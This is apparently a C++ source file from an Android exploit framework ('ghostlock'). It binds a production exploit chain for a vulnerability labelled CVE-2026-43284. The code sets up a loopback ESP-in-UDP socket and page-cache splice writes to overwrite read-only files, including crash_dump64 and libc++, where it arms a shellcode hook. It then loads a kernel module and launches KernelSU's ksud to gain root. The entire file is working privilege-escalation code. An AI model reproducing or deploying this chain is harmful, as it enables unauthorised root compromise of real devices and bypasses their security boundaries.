/* Composition-root production binding for CVE-2026-43284 -- implementation.
 * See execution_binding.hpp for the contract and the fail-closed rules. */

#include "backend/cve_2026_43284/execution_binding.hpp"

#include "backend/cve_2026_43284/schema.hpp"
#include "backend/cve_2026_43284/steps/crash_dump.hpp"
#include "platform/device_facts.hpp"
#include "session/runtime_config.h"
#include "session/runtime_paths.h"
#include "terminal/root_program.hpp"
#include "terminal/umh_forward.hpp"

#include <cstddef>
#include <cstdint>
#include <optional>
#include <string_view>

#if defined(__linux__)
#include <cerrno>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284 {
    namespace {
#if defined(__linux__)
        /* Builds the root-program argv from the runtime home: the Kotlin entry
         * copies ksud to $GHOSTLOCK_HOME/ksud, so the LKM's late-load command
         * names that file. Bounded; set_argv truncates. */
        void set_root_program(terminal::RootProgram &program) noexcept {
            char buffer[terminal::RootProgram::kArgvCapacity] = {};
            const std::string_view home =
                    config::runtime_config_snapshot().home_dir;
            std::size_t n = 0U;
            for (const char c : home) {
                if (n + 1U >= sizeof(buffer)) {
                    break;
                }
                buffer[n++] = c;
            }
            constexpr std::string_view kKsudSuffix = "/ksud";
            for (const char c : kKsudSuffix) {
                if (n + 1U >= sizeof(buffer)) {
                    break;
                }
                buffer[n++] = c;
            }
            buffer[n] = '\0';
            program.kind = terminal::RootProgramKind::KernelSU;
            program.set_argv(std::string_view(buffer, n));
        }

        /* Connected ESP-in-UDP sender socket from the session SA: bind
         * 127.0.0.1:sender_port, connect 127.0.0.1:encap_port. Mirrors the
         * staged entry's helper; retained here so the production binding is
         * self-contained. Returns the fd or a negative -errno. */
        int connect_esp_socket(const IpsecSaParams &sa) noexcept {
            const int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                return -errno;
            }
            int opt = 1;
            (void)::setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt,
                               static_cast<socklen_t>(sizeof(opt)));
            sockaddr_in source{};
            source.sin_family = AF_INET;
            source.sin_port = htons(sa.sender_port);
            source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::bind(fd, reinterpret_cast<sockaddr *>(&source),
                       static_cast<socklen_t>(sizeof(source))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            sockaddr_in destination{};
            destination.sin_family = AF_INET;
            destination.sin_port = htons(sa.encap_port);
            destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::connect(fd, reinterpret_cast<sockaddr *>(&destination),
                          static_cast<socklen_t>(sizeof(destination))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            return fd;
        }
#endif
    } // namespace

    bool production_module_precheck(
            void *ctx, std::string_view path,
            const lkm::DeviceKernelFacts &required, lkm::ModuleFacts &facts,
            lkm::LkmImageError &error) noexcept {
        (void)ctx;
        return stage_runner::precheck_staged_module(path, required, facts, error);
    }

    ExecutionBindResult bind_production_execution_with(
            session::CoreSession &session, ProductionResources &resources,
            const profile::Document &document, const IpsecSaParams &sa,
            std::string_view module_path,
            const platform::DeviceProbeOps &device) {
        ExecutionBindResult result{};
        if (module_path.empty()) {
            result.error = ExecutionBindError::ModulePathEmpty;
            return result;
        }
        /* Module mirror + aligned single-region write plan. */
        if (!stage_runner::build_module_plan(module_path, resources.module,
                                             result.plan_error)) {
            result.error = ExecutionBindError::ModuleReadFailed;
            return result;
        }
        /* Single carrier: the profile token selects one default; token 0/absent
         * takes the first default the device reports present. */
        const std::optional<std::uint64_t> token =
                ghostlock::backend::carrier_path_token_from(document);
        const steps::CarrierTarget *chosen = nullptr;
        if (!select_single_carrier(token, device, chosen) || chosen == nullptr) {
            result.error = ExecutionBindError::CarrierRejected;
            return result;
        }
        resources.carrier = *chosen;

#if !defined(__linux__)
        /* The real chain context needs Linux page-cache/crash_dump syscalls; a
         * non-Linux host fails closed instead of pretending to bind. */
        (void)session;
        (void)sa;
        result.error = ExecutionBindError::TargetUnavailable;
        return result;
#else
        RealChainContext &ctx = resources.chain;
        ctx.page.sa = sa;
        ctx.page.io = pagecache::real_splice_io();
        ctx.device = device;
        ctx.trigger_delay_ms = 500U;
        ctx.target_path = resources.carrier.path.data();
        ctx.bridge = steps::real_crash_dump_bridge();

        char target_path[steps::kCarrierPathMaxBytes] = {};
        const std::size_t path_bytes =
                resources.carrier.path.size() < sizeof(target_path) - 1U
                        ? resources.carrier.path.size()
                        : sizeof(target_path) - 1U;
        for (std::size_t i = 0U; i < path_bytes; ++i) {
            target_path[i] = resources.carrier.path[i];
        }

        const int target_fd = ::open(target_path, O_RDONLY | O_CLOEXEC);
        std::uint64_t target_size = 0U;
        if (target_fd >= 0) {
            struct stat st{};
            if (::fstat(target_fd, &st) == 0 && st.st_size > 0) {
                target_size = static_cast<std::uint64_t>(st.st_size);
            }
        }
        /* A vendor target the App cannot open is still reachable through the
         * crash_dump bridge (old-page read + helper splice); any other open
         * failure is fatal. */
        const bool helper_carrier =
                target_fd < 0 && ctx.bridge.available() &&
                steps::is_vendor_path(resources.carrier.path);
        if (target_fd < 0 && !helper_carrier) {
            result.error = ExecutionBindError::TargetUnavailable;
            return result;
        }
        ctx.page.file_fd = target_fd;
        ctx.page.socket_fd = connect_esp_socket(sa);
        if (ctx.page.socket_fd < 0) {
            if (target_fd >= 0) {
                (void)::close(target_fd);
            }
            ctx.page.file_fd = -1;
            result.error = ExecutionBindError::TargetUnavailable;
            return result;
        }
        /* patch #1 target: app-readable in the untrusted_app domain. */
        ctx.crash_dump_fd = ::open(steps::kCrashDump64Path, O_RDONLY | O_CLOEXEC);

        /* libc++ hook: own page-cache face over the carrier session socket, plus
         * the crash_dump helper fallback when the App cannot open the file. */
        ctx.hook_path = steps::kLibcxxPath;
        ctx.hook_page.sa = sa;
        ctx.hook_page.io = ctx.page.io;
        ctx.hook_page.file_fd = ::open(steps::kLibcxxPath, O_RDONLY | O_CLOEXEC);
        ctx.hook_page.socket_fd = ctx.page.socket_fd;
        if (ctx.hook_page.file_fd < 0 && ctx.bridge.available()) {
            ctx.hook_page.old_page.ctx = &ctx.page;
            ctx.hook_page.old_page.read16 = &real_chain_hook_old_page_read16;
            ctx.hook_page.helper_write.ctx = &ctx.page;
            ctx.hook_page.helper_write.splice16 = &real_chain_hook_helper_splice16;
        }
        const steps::HookPatchIo hook_io = make_real_hook_io(ctx.hook_page);
        const stage_runner::StagedHookAssets hook_assets =
                stage_runner::prepare_staged_hook(
                        ctx, steps::kLibcxxPath, steps::kLibcxxSentrySymbol,
                        steps::HookGuardPolicy::Reject, resources.hook_image,
                        resources.hook_shellcode.data(),
                        resources.hook_shellcode.size(),
                        resources.hook_shellcode_orig.data(), hook_io);
        if (hook_assets.status != stage_runner::StagedHookStatus::Armed) {
            /* The production chain must have the libc++ sentry hook armed; a
             * missing image/IO fails closed before patch #1 or any write. */
            real_chain_release(&ctx.page);
            result.error = ExecutionBindError::HookUnavailable;
            return result;
        }

        /* Install into the backend state. The state keeps pointers into the
         * caller-owned resources, which the composition root keeps alive across
         * the run. */
        Cve2026_43284State &state = cve_2026_43284_state(session);
        state.sa = sa;
        set_root_program(state.root_program);
        state.deps = BackendTerminalDeps{};
        state.deps.device = device;
        state.deps.chain = make_real_chain_ops(ctx);
        state.deps.carrier = &resources.carrier;
        state.deps.plan = &resources.module.plan;
        state.deps.target_size = target_size;
        state.deps.precheck_lkm = &production_module_precheck;
        state.deps.lkm_image_path = module_path;
        state.deps.wait_timeout_ms = 5000U;
        state.deps.umh_channel = terminal::production_umh_channel();
        result.error = ExecutionBindError::None;
        return result;
#endif
    }

    ExecutionBindResult bind_production_execution(
            session::CoreSession &session, ProductionResources &resources,
            const profile::Document &document, const IpsecSaParams &sa) {
        const config::RuntimeConfig &runtime =
                config::runtime_config_snapshot();
        /* The resources object owns the path so the state's lkm_image_path view
         * outlives this call; deliberately not a RuntimeConfig field to keep
         * the 43499 CoreSession layout untouched. */
        resources.module_path = config::helper_module_file(runtime.home_dir);
        return bind_production_execution_with(
                session, resources, document, sa, resources.module_path,
                platform::real_device_probe());
    }

} // namespace ghostlock::backend::cve_2026_43284
